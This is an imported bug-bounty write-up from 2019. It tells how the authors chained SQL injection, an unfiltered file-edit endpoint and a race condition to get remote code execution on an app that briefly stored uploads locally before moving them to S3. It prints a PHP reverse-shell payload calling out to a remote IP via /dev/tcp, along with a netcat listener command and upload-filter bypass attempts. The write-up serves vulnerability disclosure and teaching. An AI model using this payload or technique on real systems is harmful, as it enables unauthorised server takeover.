---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-09-14_race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-store.md
original_filename: 2019-09-14_race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-store.md
title: Race Condition that could Result to RCE - (A story with an App that temporary
  stored an uploaded file within 2 seconds before moving it to Amazon S3)
category: documents
detected_topics:
- xss
- sqli
- command-injection
- file-upload
- race-condition
- api-security
tags:
- imported
- documents
- xss
- sqli
- command-injection
- file-upload
- race-condition
- api-security
language: en
raw_sha256: 5c6b48b98cb03794d4445eaa6ff26fab026f171478fbb7c6df238cf7fc7defd6
text_sha256: ac474cbdd8962d454c8c6609dc1501efe7b27fa892bbe2294403d0cce0846bb8
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-09-14_race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-store.md
- Source Type: markdown
- Detected Topics: xss, sqli, command-injection, file-upload, race-condition, api-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `5c6b48b98cb03794d4445eaa6ff26fab026f171478fbb7c6df238cf7fc7defd6`
- Text SHA256: `ac474cbdd8962d454c8c6609dc1501efe7b27fa892bbe2294403d0cce0846bb8`


## Content

---
title: "Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3)"
url: "https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3"
authors: ["YoKo Kho (@YokoAcc)"]
bugs: ["Race condition", "RCE", "Unrestricted file upload"]
publication_date: "2019-09-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5028
scraped_via: "browseros"
---

# Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3)

Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3)
YoKo Kho
Follow
8 min read
·
Sep 14, 2019

456

2

بسم الله الرحمن الرحيم

- Part I from (hopefully) IV Parts -

Update I: Added a “Reference” Section.

Update II: “We” at this series of article will refer to 
Faisal Yudo Hernawan
, 
Tomi
, and Me.

Update III: The way to exploiting the “upload.php” function has been released at Tomi’s write-up. It could be bypass with the .phtml extension.

I. INTRODUCTION

1.1. Few Words about this Write-Up

As an information, this simple write-up talks about a story related how I chained few bugs at one of private program, which is from a simple recon to simple SQL Injection, Race Condition, and finally lead to an RCE. Since the found RCE is little unique, then, this simple write-up will begin from an RCE that triggered from Race Condition. InshaAllah, the other will be released later.

1.2. Simple Summary

Some reader maybe feels more comfortable with a summary. Then at this section, we will explain the whole summary related our “journey” to get an RCE.

While we got an access into the internal dashboard of administrator (by using the account that has been dump from SQL Injection Result), then we found out the upload feature in the app.

Basically, this app has a protection for not giving any permission to users to upload the .php extension (let’s say, the function is upload.php - previously, it was vulnerable by uploading the .phtml extension). But then, the first unique issue is come when this application provides another function (let’s called, modify.php) that could be used to replace / deleteing the previous uploaded file. The good one is, this modify.php function is not designed to filtering any extension just like the upload.php did. So, we could easily to upload the .php file into the site.

But then, the problem for us exists when the app moving out the uploaded file into the S3 bucket. In other words, it’s not possible then to get an RCE at the app’s server since the shell is stored at S3 bucket (and didn’t work too).

At one condition, then we tried to re-send the upload request (by using those modify.php function) multiple times (it just like a race condition) and suddenly we got a different response length that contain an error with local stored path information. From this execution, then we realized if the file was stored locally around 2 seconds before its automatically moving into the S3 bucket.

So, the next is, we setup the listener at our server (by simply using an “nc -lvp listener_port”), and then tried to conduct the same race condition again (with re-uploading the reverse shell at the modify.php function) and finally in parallel, we request the found local stored path previously at the our browser (it just like, we press the “Command + R” multiple times) until our terminal showing up the shell from the app’s server.

After several request (somehow more than 20–30 requests), then finally we got a shell of the app’s server.

Press enter or click to view image in full size
Figure 1 RCE Result
II. THE DETAIL STORY ABOUT THE RCE

At this section, we will try to explain in step by step about how finally we got an RCE.

FYI, we tried to sketch the interface manually as best as we can, so hopefully could help the readers to see the situation.

2.1. Facing the Internal Dashboard — Meet the Upload Function

So, after we got an access into the internal dashboard (will be released later about how we got it), we didn’t stop hunting. At this point, then we tried to look any file upload feature that maybe exist at the app. After few minutes, then we finally found a feature that could be used to publish a news/article via this dashboard. And then, we learn that if every file that we would like to upload to every available section (news/article or anything), then it will be procced by the function called upload.php.

Basically, every available section will have an upload interface like this:

Press enter or click to view image in full size
Figure 2 Interface of Upload Feature

Without thinking too much, then we directly upload the simple .php shell again via this feature (previously, it was vulnerable by giving the .phtml extension and fixed. Then we tried to test this feature again). But things aren’t going well, the feature has a protection to filter the .php extension. We tried to combining the extension with upper & lower case (ex: .PhP), also added some number behind the extension (ex: .php3), and tried various way (as far as we know — doubling the extension, null character, added ; character, and more) to bypass the protection, then it failed. We always got this lovely warning.

Press enter or click to view image in full size
Figure 3 Protection at the Application

Then we think, how about the stored XSS, such as maybe upload the .html, .xml, or .svg format? Well, this one is successfully uploaded. But then, we realized if the file was moving out into the S3 bucket. Then, what’s the point if we could trigger the XSS but at the S3 bucket domain? Well, since we have no idea to “using” it further, then we assume if this one is not an issue.

2.2. Meet the Second Upload Function, Modify.php

What’s next? After we have no idea about how to “use” the “uploaded” file into the S3 bucket, then we back into first page of “news” section that contain so many forms to be add with the new content.

After looking it carefully, then we realized if there is an “edit” button at the same row with the legitimate file that uploaded into the S3 bucket.

Press enter or click to view image in full size
Figure 4 Function Edit / Delete the Uploaded File

At this point, we try to click the “edit” button and trying to see what will happened.

Just as expected, then we will face the upload feature too at this section. At the first time we see it, we think that this form is filtering the .php extension too (since we thought, how can it could be different with the first one?). But, surprisingly, this upload feature doesn’t filter any extension yet.

Get YoKo Kho’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

In short, we could upload the .php file directly without meet any trouble.

Press enter or click to view image in full size
Figure 5 Upload Feature to Replacing the Existing File

When our shell has been uploaded, then we try to re-upload the shell and find out the function that used. If this one doesn’t have any filter feature yet, then high possibility if this is the different function as previous. And our assumption is correct. The function that used at this endpoint is “modify.php”, not “upload.php”. Here is the sample request that made with “modify.php”:

Content-Disposition: form-data; name="fileid"
31337
-----------------------------09234599689937136550676151776
Content-Disposition: form-data; name="name"
picture-1.png
-----------------------------09234599689937136550676151776
Content-Disposition: form-data; name="description"
-----------------------------09234599689937136550676151776
Content-Disposition: form-data; name="userfile"; filename="reverse.php"
Content-Type: text/php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.20.30.40/21234 0>&1'");
-----------------------------09234599689937136550676151776
Content-Disposition: form-data; name="save"
Save

So, is it finish? So sad, not yet. The .php file is also moving out into the S3 bucket and we can’t do anything with the uploaded file.

2.3. Race Condition to Get the Local Path

To be honest, at that time, we have no idea anymore, until we finally try to send the request multiple times with “null” payloads (via intruder mode at burpsuite). Please kindly don’t ask, why we do that.

Surprisingly, after several request has been made, we got a different response length (somehow need around 10 requests, somehow more than 20–30 requests). If the normal request will result to 1147 response lengths, at one point, it hits 1710 response lengths.

Here is the sample of the “same” multiple request that we did:

Press enter or click to view image in full size
Figure 6 Sending Multiple Request with Null Payload

And here is the normal response that we will get normally (1147 response lengths):

Press enter or click to view image in full size
Figure 7 Normal Response with 1147 Response Lengths

So, what is the content from the un-normal response length that we got? The good one, it reveals the local path of the file.

Press enter or click to view image in full size
Figure 8 The Race Condition has Reveals the Local Path

When we see this result, then finally we thought if we just need to access the path at the browser and waiting for the listener triggering up the shell.

But once again, so sad, it not like that. When access the file via our browser, we got the famous alert, which is: “File not Found”. And if we check the path of the file that has been uploaded, it still showing the S3 bucket location, not the local path that we got from this error.

So, from this execution, we learn if the file is somehow was stored locally around 1–2 seconds before they move it automatically into the S3 bucket.

2.4. Triggering the Shell and Got an RCE

From the last assumption, then there is one thing that come up at our mind: “how if we run the race condition again, and at the same time, we request the local path that we found (from the error result) to our browser to triggering the reverse shell?”

How is it? Finally, this trick works well.

So, we setup the listener at our server -> then try to replacing the existing file at the app with our reverse shell -> conduct the race condition multiple times (1,000 requests could buffer our time) -> take the local path from the different response length from race condition execution -> repeatedly access the path via our browser -> and when the app is hit by the race condition again, then the shell will be triggered into our listener.

Here is the simple flow related the execution:

Press enter or click to view image in full size
Figure 9 Flow of the Execution

And here is the simple result from the RCE:

Press enter or click to view image in full size
Figure 10 RCE Result
III. THE CLOSING

Much things (at least, for us) that we could learned from this bug. Few of the good things are:

There is a possibility for us to get the local path of the uploaded file before the file itself is moving out into the S3 bucket. Even only 1 or 2 seconds, then its enough for us to triggering the shell into our listeners;
Always try to edit your own uploaded file. From this case, we seen that if there is a possibility if the upload feature is executed from two separate function (which is the upload.php and modify.php in this situation);
And maybe much more that we don’t know yet.
IV. REFERENCES

Here are some references that (hopefully) relevant with this write-up:

https://www.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010)
https://securingtomorrow.mcafee.com/business/testing-race-conditions-web-applications/
https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e
https://www.owasp.org/index.php/Unrestricted_File_Upload
https://www.slideshare.net/HackIT-ukraine/15-technique-to-exploit-file-upload-pages-ebrahim-hegazy

Follow Infosec Write-ups for more such awesome write-ups.

InfoSec Write-ups
A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub…

medium.com
